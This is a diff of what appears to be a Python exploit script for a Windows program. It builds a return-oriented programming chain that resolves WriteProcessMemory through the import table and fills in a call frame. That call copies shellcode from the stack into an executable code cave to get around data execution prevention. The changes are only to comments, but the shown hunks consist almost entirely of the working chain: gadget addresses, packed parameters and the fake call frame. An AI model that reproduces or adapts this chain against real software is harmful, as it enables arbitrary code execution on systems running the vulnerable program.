@@ -136,11 +136,11 @@ rop = [
 # 3. Deref WriteProcessMemory (in eax)
     0x4030d7,       # pop eax ; pop ecx ; ret
                     # Place VirtualAlloc into EAX
-    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x77932510 KERNEL32!WriteProcessMemoryStub
+    0x0044a1fc,       # base + iat + WriteProcessMemory = 0x0044a1fc -> 0x77932510 KERNEL32!WriteProcessMemoryStub
     0xffffffff,     # junk for pop ecx
 
     0x410515,       # mov eax, [eax] ; ret
-                    # Derefernces the address in EAX to get the actual function pointer
+                    # Result: Dereferences the address in EAX to get the actual function pointer
                     # of WriteProcessMemory.
 
                     # Before instruction: EAX contains 0x0044a1e8
@@ -157,7 +157,7 @@ rop = [
     0x1c,           # hex(28)
 
     0x401ff3,       # add edx, ecx ; ret
-                    # Adds 0x18 to EDX (which contains original skeleton call)
+                    # Adds 0x18 to EDX (EDX contained original skeleton call)
                     # EDX now points to shellcode address parameter
 
     0x402ce8,       # mov eax, edx
@@ -191,7 +191,7 @@ rop = [
     0x401fe7,       # mov [ebx], eax
                     # 0x011678e8 Shellcode Stack Address (src)
 
-# 10. 0x64646464 Get skeleton call addr + 0x14
+# 10. 0x66666666 Get skeleton call addr + 0x14
     0x401fef,       # add ebx, 0x4 ; ret
     0x401fef,       # add ebx, 0x4 ; ret
                     # Results: EBX is on skeleton call + 0x14 (0x66666666)
@@ -220,7 +220,7 @@ rop = b"".join([pack("<I", r) for r in rop])
 # ===
 
 dummy  = b"aaaa"                # WriteProcessMemory     <- The Call
-dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave
+dummy += pack("<I", 0x00410640) # Ret                    <- Ret2Code_Cave (RX)
 dummy += pack("<I", 0xffffffff) # hProcess               <- (-0x1 Current Process)
 dummy += pack("<I", 0x00410640) # lpBaseAddress          <- Code Cave Address (dst)
 dummy += b"dddd"                # lpBuffer               <- Shellcode (STACK) (src)
